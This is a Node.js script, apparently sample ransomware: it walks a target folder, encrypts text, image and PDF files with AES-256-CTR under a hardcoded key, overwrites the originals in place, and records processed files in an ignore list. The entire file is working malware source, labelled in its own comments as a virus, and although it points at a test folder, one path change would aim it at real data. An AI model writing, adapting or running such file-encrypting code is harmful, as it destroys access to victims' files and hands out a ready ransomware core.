//Dependencies
const crypto    =  require('crypto');
const fs        = require('fs');
const walk      = require('walk');

//Configurations
const encryptionAlgorithm = 'aes-256-ctr';
const targetFolder = './TestFiles/';
const ignoreListFilePath = '.ignoreList';
const key = '$myvirus_sample_encryption_key!!';
const targetExtensions = ['txt', 'png', 'gif', 'jpg', 'pdf'];
let ignoreList = [];

// Walker options
let fileWalker  = walk.walk(targetFolder, { followLinks: false });

//Read file and execute callback with file content
function readFileContents(file, callback) {
    fs.readFile(file, (err, data) => {
        if (err) throw err;
        callback(data);
    });
}

//Receive file content and a password and return encrypted file content
function encryptFile(file, password) {
    let cipher = crypto.createCipher(encryptionAlgorithm,password);
    return Buffer.concat([cipher.update(file), cipher.final()]);
}

//Save data to a file located at fileLocation and execute the callback with fileLocation
function saveToFile(fileLocation, data, callback) {
    fs.writeFile(fileLocation, data, (err) => {
        if(err) {
            return console.log(err);
        }
        callback(fileLocation);
    });
}

//Search for files to cypher and overwrite
function creepto(){
    fileWalker.on('file', (root, stat, next) => {
        let splitedFileName = stat.name.split('.');
        if(stat.type === 'file' && targetExtensions.indexOf(splitedFileName[splitedFileName.length-1]) !== -1 && ignoreList.indexOf(root + '/' + stat.name) === -1){
            readFileContents(root + '/' + stat.name, (fileData)=>{
                let encryptedData = encryptFile(fileData, key);
                ignoreList.push(root + '/' + stat.name);
                saveToFile('./'+ignoreListFilePath, JSON.stringify(ignoreList), ()=>{
                    saveToFile(root + '/' + stat.name, encryptedData, ()=>{
                        console.log(stat.name + ' encrypted');
                    });
                });
            })
        }
        next();
    });
}

//Load files already overridden to avoid cyphering twice and call main virus function (creepto)
if (fs.existsSync('./'+ignoreListFilePath)) {
    readFileContents('./'+ignoreListFilePath, (fileData)=>{
        ignoreList.concat(JSON.parse(fileData));
        creepto();
    });
}else{
    creepto();
}